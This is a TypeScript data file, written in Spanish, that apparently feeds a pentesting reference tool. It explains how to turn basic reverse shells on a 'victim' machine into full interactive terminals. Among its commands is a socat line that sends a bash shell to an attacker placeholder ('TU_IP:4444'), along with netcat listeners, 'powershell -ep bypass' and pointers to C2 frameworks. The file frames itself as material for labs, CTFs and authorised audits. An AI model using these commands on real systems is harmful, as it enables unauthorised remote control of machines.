/* TTY Upgrade: convierte reverse shells tontas en terminales
   interactivas completas. Métodos con pasos detallados. */

export type TtyMethodId = 'python' | 'python3' | 'script' | 'socat' | 'rlwrap' | 'stty' | 'windows'

export interface TtyMethod {
  id: TtyMethodId
  label: string
  quality: '⭐⭐⭐⭐⭐' | '⭐⭐⭐⭐' | '⭐⭐⭐' | '⭐⭐'
  desc: string
  when: string
  steps: string[]
  requirements: string
}

export const TTY_METHODS: TtyMethod[] = [
  {
    id: 'python3',
    label: 'Python3 PTY (el estándar)',
    quality: '⭐⭐⭐⭐⭐',
    desc: 'spawn de PTY con Python y calibración de terminal con stty',
    when: 'la víctima tiene python3 (el 95% de Linux moderno)',
    steps: [
      '1. En la reverse shell de la víctima:',
      '   python3 -c \'import pty; pty.spawn("/bin/bash")\'',
      '(o python si no hay python3)',
      '',
      '2. SUSPENDER con Ctrl+Z (vuelve a tu terminal)',
      '',
      '3. En TU máquina:',
      '   stty raw -echo; fg',
      '(raw: sin interpretación · -echo: no duplica · fg: reanuda la shell)',
      '',
      '4. Calibrar tamaño (en la víctima, tras fg):',
      '   export TERM=xterm',
      '   stty rows <ROWS> cols <COLS>   # de stty -a en tu terminal ANTES de fg',
      '',
      '5. Listo: Ctrl+C matará solo procesos remotos, tab-completion, history…',
    ],
    requirements: 'python3/python en la víctima',
  },
  {
    id: 'script',
    label: 'script (sin Python)',
    quality: '⭐⭐⭐⭐',
    desc: 'utilidad script(1) de util-linux: crea PTY sin Python',
    when: 'sin Python pero con util-linux (siempre presente en Linux)',
    steps: [
      '1. En la reverse shell:',
      '   script /dev/null -c bash',
      '(versiones antiguas: script -qc bash /dev/null)',
      '',
      '2. Ctrl+Z → stty raw -echo; fg → reset (Enter 2 veces si sale raro)',
      '',
      '3. Igual que Python: export TERM=xterm + stty rows/cols',
    ],
    requirements: 'script de util-linux (estándar en toda distro)',
  },
  {
    id: 'socat',
    label: 'socat completo (la mejor de todas)',
    quality: '⭐⭐⭐⭐⭐',
    desc: 'si puedes subir/subir socat, obtienes PTY completa desde el primer momento',
    when: 'puedes transferir un binario (estático si hace falta) a la víctima',
    steps: [
      '1. En TU máquina (listener con PTY):',
      '   socat file:`tty`,raw,echo=0 tcp-listen:4444',
      '',
      '2. En la víctima:',
      '   socat exec:\'pty,stderr,setsid,/bin/bash\' tcp:TU_IP:4444',
      '(o /bin/sh si no hay bash)',
      '',
      '3. Resultado: PTY completa SIN pasos manuales, con Ctrl+C funcionando.',
      '',
      'Alternativa con sudo/suid: socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:TU_IP:4444',
    ],
    requirements: 'socat en ambos lados (binario estático: github.com/andrew-d/static-binaries)',
  },
  {
    id: 'rlwrap',
    label: 'rlwrap en el listener (desde tu lado)',
    quality: '⭐⭐⭐',
    desc: 'envuelve tu listener con readline: history y flechas SIN tocar la víctima',
    when: 'no puedes hacer nada en la víctima y aceptas mejoras solo de tu lado',
    steps: [
      '1. En TU máquina:',
      '   rlwrap nc -lvnp 4444',
      '(o rlwrap -cR nc -lvnp 4444 para color y flechas)',
      '',
      '2. La reverse shell conecta como siempre: tendrás history con ↑, aunque',
      '   sigue siendo una shell "dumb" (Ctrl+C la mata entera).',
    ],
    requirements: 'rlwrap instalado en tu máquina (apt install rlwrap)',
  },
  {
    id: 'stty',
    label: 'stty manual (mini-referencia)',
    quality: '⭐⭐',
    desc: 'qué hace exactamente cada truco de terminal del método Python',
    when: 'para entender y debuggear cuando algo falla',
    steps: [
      'stty -a                    # ver configuración actual (ROWS/COLS arriba)',
      'stty raw -echo             # raw: pasa los bytes tal cual; -echo: no los repites tú',
      'stty sane                  # restaurar terminal (el "undo" universal)',
      'reset                      # idem, más fuerte (reinicia el terminal entero)',
      'stty rows 40 cols 120      # calibrar al tamaño de TU terminal real',
      '',
      'El orden importa: stty raw -echo DEBE correr ANTES de fg, y el fg trae la',
      'shell de vuelta al primer plano. Si escribes a ciegas tras fg, es normal:',
      'Enter y aparecerá.',
    ],
    requirements: 'nada: todo es local',
  },
  {
    id: 'windows',
    label: 'Windows: pseudo-consolas',
    quality: '⭐⭐⭐',
    desc: 'en Windows no hay PTY de UNIX: opciones para shells más útiles',
    when: 'target Windows con reverse shell básica',
    steps: [
      'Opción 1 —Upgrade a PowerShell con datos de entrada:',
      '   powershell -ep bypass (desde la cmd de la shell)',
      '',
      'Opción 2 —convechterm / conpty (si puedes subir binarios):',
      '   conhost.exe --headless cmd.exe   # Server 2019+',
      '',
      'Opción 3 —C2 real (la forma pro):',
      '   meterpreter ya trae "shell" conPTY integrado; Sliver/PoshC2 igual.',
      '',
      'Opción 4 —winrs/powershell remoto (si tienes creds):',
      '   winrs -r:TARGET cmd   o   Enter-PSSession TARGET (WinRM abierto)',
      '',
      'Realidad: en Windows, ctrl+c y flechas rara vez funcionan en una nc simple.',
      'La solución de verdad es un agente C2, no un "upgrade" de TTY.',
    ],
    requirements: 'varía según la opción',
  },
]

export const TTY_PRECHECKS: [string, string][] = [
  ['¿es TTY ya?', 'tty → devuelve not a tty si es dumb (lo más probable tras nc) · python -c "import pty; print(pty)" ok'],
  ['¿qué python hay?', 'which python3 python python2 · ls /usr/bin/py*'],
  ['¿qué shell?', 'cat /etc/passwd | grep $USER · echo $SHELL'],
  ['¿tamaño de TU terminal?', 'stty size (anótalo: rows cols, los necesitarás tras el fg)'],
  ['¿socat/static disponible?', 'ls /usr/bin/socat · comprobar wget/curl para subir binarios'],
]

export const TTY_TROUBLESHOOT: [string, string][] = [
  ['tras fg no veo nada', 'normal: escribe Enter a ciegas. Si sigue muerto: Ctrl+Z de nuevo, stty sane, reintenta'],
  ['Ctrl+C me mata todo', 'no hiciste stty raw antes del fg: Ctrl+Z → stty raw -echo → fg'],
  ['tab-completion no funciona', 'export TERM=xterm en la víctima + stty rows/cols calibrados'],
  ['la salida sale duplicada', 'falta -echo en tu stty local: Ctrl+Z, stty raw -echo, fg'],
  ['command not found: script', 'versión vieja de util-linux: script -qc bash /dev/null (con -q y -c juntos)'],
  ['me quedé sin terminal (eco raro)', 'desde otra terminal: stty sane < /dev/tty de tu terminal rota, o ciérrala'],
]

export const TTY_NOTES: string[] = [
  'El método Python (pty.spawn + stty raw -echo + fg + TERM) es EL estándar: lo practicas una vez y lo usas para siempre.',
  'La calibración stty rows/cols es lo que distingue una shell usable de una chapuza: editores (vi/nano) la necesitan.',
  'Con IPv6: socat -6 tcp-listen:4444 … y ssh -6 · con TLS: socat OPENSSL-LISTEN:4444,… (ver RevShells para generadores completos).',
  'Recordatorio ético: estas técnicas son para tus labs, CTFs y auditorías autorizadas — son EXACTAMENTE las que documenta OSCP.',
]
